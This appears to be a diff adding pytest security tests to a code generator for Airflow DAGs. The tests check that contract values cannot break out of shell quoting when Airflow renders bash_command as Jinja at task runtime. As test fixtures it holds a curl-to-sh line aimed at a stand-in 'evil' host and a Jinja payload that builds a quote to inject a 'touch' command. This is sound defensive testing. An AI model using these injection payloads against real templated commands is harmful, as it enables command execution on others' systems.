@@ -32,6 +32,7 @@ present, survives only as inert string data.
 from __future__ import annotations
 
 import ast
+import shlex
 
 import pytest
 
@@ -499,3 +500,90 @@ def test_schedule_task_script_is_shell_quoted_not_just_python_inert():
     assert commands, "no bash_command found"
     # shlex.quote wraps the whole value, so the `;` is inside quotes.
     assert commands[0] == "'job.py; curl http://evil/s | sh'", commands[0]
+
+
+# ---------------------------------------------------------------------------
+# The RUNTIME layer. `bash_command` is an Airflow `template_field`, so Airflow
+# re-renders it as Jinja at TASK runtime -- after generation-time quoting is
+# baked in. `shlex.quote` does nothing to `{{ ... }}`, and Jinja string escapes
+# can synthesise a quote from a payload containing none, escaping the quoting.
+# `assert_inert` cannot see this: it only parses the generated Python.
+# ---------------------------------------------------------------------------
+
+#: Renders to a bare `'` without containing one, so shlex.quote has nothing
+#: to escape. This is the payload that defeats quoting-only defences.
+POC_JINJA_QUOTE = '{{ "\\x27" }}; touch /tmp/FLUID_PWNED; #'
+
+
+def _bash_commands(code):
+    """Every `bash_command=` value in the generated DAG, as Python sees it."""
+    return [
+        kw.value.value
+        for node in ast.walk(ast.parse(code))
+        if isinstance(node, ast.Call)
+        for kw in node.keywords
+        if kw.arg == "bash_command" and isinstance(kw.value, ast.Constant)
+    ]
+
+
+def _render_like_airflow(command: str) -> str:
+    """Render as Airflow does, with a hostile DAG object in context."""
+    sandbox = pytest.importorskip("jinja2.sandbox")
+
+    class _Dag:
+        description = "'; touch /tmp/FLUID_PWNED_VIA_DAG; #"
+        dag_id = "d"
+
+    class _Var:
+        """Stands in for Airflow's `var.value.<key>` accessor."""
+
+        value = type("V", (), {"__getattr__": lambda self, k: "resolved-" + k})()
+
+    env = sandbox.SandboxedEnvironment()
+    return env.from_string(command).render(dag=_Dag(), var=_Var())
+
+
+@pytest.mark.parametrize(
+    "params",
+    [
+        {"exposeId": POC_JINJA_QUOTE},
+        {"exposeId": "e", "binding": {"location": {"project": POC_JINJA_QUOTE, "dataset": "d"}}},
+        {"exposeId": "e", "binding": {"location": {"project": "p", "dataset": POC_JINJA_QUOTE}}},
+        {"exposeId": "{{ dag.description }}"},
+    ],
+)
+def test_contract_value_cannot_inject_via_runtime_jinja_render(params):
+    """After Airflow's render, the shell must still see one inert token."""
+    code = _dag_from_actions(
+        [{"actionId": "a1", "action": "provisionDataset", "provider": "gcp", "params": params}]
+    )
+    for command in _bash_commands(code):
+        rendered = _render_like_airflow(command)
+        # The payload must not have escaped into a second shell command.
+        assert "touch /tmp/FLUID_PWNED" not in shlex.split(rendered), rendered
+        for token in shlex.split(rendered):
+            assert not token.startswith("touch"), f"escaped the quoting: {rendered}"
+
+
+def test_schedule_task_script_cannot_inject_via_runtime_jinja_render():
+    code = _dag_from_actions(
+        [
+            {
+                "actionId": "a1",
+                "action": "scheduleTask",
+                "params": {"engine": "dbt", "script": POC_JINJA_QUOTE, "buildId": "b1"},
+            }
+        ]
+    )
+    for command in _bash_commands(code):
+        rendered = _render_like_airflow(command)
+        assert shlex.split(rendered)[:3] == ["dbt", "run", "--select"], rendered
+        assert len(shlex.split(rendered)) == 4, f"escaped the quoting: {rendered}"
+
+
+def test_generator_authored_jinja_defaults_still_render():
+    """The fix must not break the generator's own `{{ var.value.* }}`."""
+    code = _dag_from_actions(
+        [{"actionId": "a1", "action": "provisionDataset", "provider": "gcp", "params": {}}]
+    )
+    assert any("var.value.gcp_project" in c for c in _bash_commands(code))
